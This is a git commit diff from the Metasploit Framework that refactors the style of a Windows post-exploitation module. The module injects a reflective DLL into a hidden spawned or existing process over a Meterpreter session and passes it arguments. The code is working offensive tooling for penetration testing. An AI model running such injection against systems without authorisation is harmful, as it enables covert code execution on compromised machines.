0d36c99151de2b689a406e3ac6fab45e317aa704
Spencer McIntyre <Spencer_McIntyre@rapid7.com>
2020-02-06 17:40:44 -0500

    Minor code tweaks for PR 12865 before testing

--- modules/post/windows/manage/reflective_dll_inject.rb
+++ modules/post/windows/manage/reflective_dll_inject.rb
@@ -13,57 +13,43 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Windows Manage Reflective DLL Injection
-      Module with arguments',
-      'Description' => '
-      This module will inject a specified reflective DLL
-      into the memory of a process, new or existing,
-      passing any arguments.
-      ',
-      'License' => MSF_LICENSE,
-      'Author' => ['Ben Campbell','b4rtik'],
-      'Platform' => 'win',
+      'Name'        => 'Windows Manage Reflective DLL Injection Module with arguments',
+      'Description' => %q{
+        This module will inject a specified reflective DLL into the memory of a
+        process, new or existing, passing any arguments.
+      },
+      'License'      => MSF_LICENSE,
+      'Author'       => ['Ben Campbell', 'b4rtik'],
+      'Platform'     => 'win',
       'SessionTypes' => ['meterpreter'],
       'References'   =>
-      [
-        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
-      ]))
+        [
+          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
+        ]
+    ))
     register_options(
       [
-        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process.']),
-        OptInt.new('PID', [false, 'Pid  to inject', 0]),
-        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
+        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process']),
+        OptInt.new('PID', [false, 'Pid to inject', 0]),
+        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-        OptInt.new('WAIT', [false, 'Time in seconds to wait.', 0])
+        OptInt.new('WAIT', [false, 'Time in seconds to wait', 0])
       ], self.class
     )
 
     register_advanced_options(
       [
-        OptBool.new('KILL',   [ true, 'Kill the injected process at the end of the task. ', false ])
+        OptBool.new('KILL',   [ true, 'Kill the injected process at the end of the task', false ])
       ]
     )
   end
 
   def run
-    dll_path = gen_dll_path
+    dll_path = ::File.expand_path(datastore['PATH'])
     if File.file?(dll_path)
       run_dll(dll_path)
     else
       print_bad("Dll not found #{dll_path}")
-    end
-  end
-
-  def gen_dll_path
-    dll_path = ::File.expand_path(datastore['PATH'])
-    dll_path
-  end
-
-  def sanitize_process_name(process_name)
-    if process_name.split(//).last(4).join.eql? '.exe'
-      process_name
-    else
-      process_name + '.exe'
     end
   end
 
@@ -84,23 +70,28 @@ class MetasploitModule < Msf::Post
     theprocess = host_processes.find {|x| x["pid"] == pid}
 
     !theprocess.nil?
-
   end
 
   def launch_process
-    process_name = sanitize_process_name(datastore['PROCESS'])
+    process_name = datastore['PROCESS']
+    process_name << '.exe' unless process_name.end_with?('.exe')
+
     print_status("Launching #{process_name} ...")
     channelized = datastore['WAIT'] != 0
 
-    process = client.sys.process.execute(process_name, nil,
-      'Channelized' => channelized,'Hidden' => true)
+    process = client.sys.process.execute(
+      process_name,
+      nil,
+      'Channelized' => channelized,
+      'Hidden' => true
+    )
 
     hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
     print_good("Process #{hprocess.pid} created.")
     [process, hprocess]
   end
 
-  def inject_dll(process,dll_path)
+  def inject_dll(process, dll_path)
     library_path = ::File.expand_path(dll_path)
     exploit_mem, offset = inject_dll_into_process(process, library_path)
     [exploit_mem, offset]
@@ -111,18 +102,18 @@ class MetasploitModule < Msf::Post
 
     if pid_exists(pid)
       print_warning('Output unavailable')
-      print_status("Opening handle to process #{datastore['PID']} ...")
+      print_status("Opening handle to process #{datastore['PID']}...")
       hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
-      print_good("Handle opened")
+      print_good('Handle opened')
       [nil, hprocess]
     else
-      print_bad("Pid not found")
+      print_bad('Pid not found')
       [nil, nil]
     end
   end
 
   def run_dll(dll_path)
-    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
+    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
     if datastore['PID'] <= 0
       process, hprocess = launch_process
     else
@@ -134,7 +125,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    exploit_mem, offset = inject_dll(hprocess,dll_path)
+    exploit_mem, offset = inject_dll(hprocess, dll_path)
 
     if datastore['ARGUMENTS'].nil?
       arg_mem = nil
@@ -153,7 +144,7 @@ class MetasploitModule < Msf::Post
       read_output(process)
     end
 
-    if datastore['KILL'] == true
+    if datastore['KILL']
       print_good("Killing process #{hprocess.pid}")
       hprocess.kill(hprocess.pid)
     end
@@ -164,7 +155,6 @@ class MetasploitModule < Msf::Post
   def copy_args(process)
     argssize = datastore['ARGUMENTS'].size + 1
     arg_mem = process.memory.allocate(argssize, PAGE_READWRITE)
-
     params = datastore['ARGUMENTS']
     params += "\x00"
 
